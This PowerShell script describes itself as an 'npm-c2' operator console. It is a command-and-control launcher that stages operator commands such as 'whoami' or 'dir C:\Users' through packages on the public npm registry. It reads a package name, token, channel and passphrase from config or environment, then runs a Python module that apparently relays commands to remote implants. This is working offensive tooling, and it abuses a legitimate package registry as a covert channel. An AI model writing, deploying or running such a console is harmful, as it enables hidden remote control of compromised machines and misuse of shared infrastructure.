#Requires -Version 5.1
<#
.SYNOPSIS
  npm-c2 operator console on Windows, over the npm staging transport.

.EXAMPLE
  .\c2.ps1
  .\c2.ps1 "whoami"
  .\c2.ps1 -Channel beef "dir C:\Users"

.DESCRIPTION
  Reads config.json if present. Environment variables override it:
  C2_PKG, C2_TOKEN, C2_CHAN, C2_PASS, NPMC2_API_BASE.
#>
[CmdletBinding()]
param(
    [Parameter(Position = 0)]
    [string]$Command,
    [string]$Channel = $env:C2_CHAN,
    [string]$Package = $env:C2_PKG,
    [string]$Passphrase = $env:C2_PASS,
    [string]$Base = $env:NPMC2_API_BASE
)

$ErrorActionPreference = 'Stop'
Set-Location -Path $PSScriptRoot

$config = $null
$configPath = Join-Path $PSScriptRoot 'config.json'
if (Test-Path $configPath) {
    $config = Get-Content $configPath -Raw | ConvertFrom-Json
}

if (-not $Package -and $config)   { $Package = $config.package }
if (-not $Channel -and $config)   { $Channel = $config.channel }
if (-not $Passphrase -and $config){ $Passphrase = $config.passphrase }
if (-not $Base -and $config)      { $Base = $config.registry }

if (-not $Channel) { $Channel = 'c0ff' }
if (-not $Base)    { $Base = 'https://registry.npmjs.org' }
if (-not $Package) { throw 'no package: edit config.json or set C2_PKG' }

$token = $env:C2_TOKEN
if (-not $token -and $config) { $token = $config.token }
if (-not $token) {
    $tokenFile = Join-Path $PSScriptRoot '.c2token'
    if (Test-Path $tokenFile) { $token = (Get-Content $tokenFile -Raw).Trim() }
}
if (-not $token) { throw 'no token: edit config.json, set C2_TOKEN or create .c2token' }

# A per-repo virtualenv keeps the host Python untouched.
$python = Join-Path $PSScriptRoot '.venv\Scripts\python.exe'
if (-not (Test-Path $python)) {
    Write-Host '[+] creating .venv'
    $launcher = Get-Command py -ErrorAction SilentlyContinue
    if ($launcher) { & py -3 -m venv .venv } else { & python -m venv .venv }
    if ($LASTEXITCODE -ne 0) { throw 'Python 3.8+ not found; install it from python.org' }
    & $python -m pip install --quiet --upgrade pip
    & $python -m pip install --quiet -e .
}

& $python -c 'import npm_c2' 2>$null
if ($LASTEXITCODE -ne 0) { & $python -m pip install --quiet -e . }

$c2args = @(
    'stage',
    '-p', $Package,
    '-t', $token,
    '-c', $Channel,
    '--base', $Base,
    '--timeout', '120',
    '--interval', '4'
)
if ($Passphrase) { $c2args += @('--passphrase', $Passphrase) }
if ($Command)    { $c2args += $Command }

& $python -m npm_c2 @c2args
exit $LASTEXITCODE
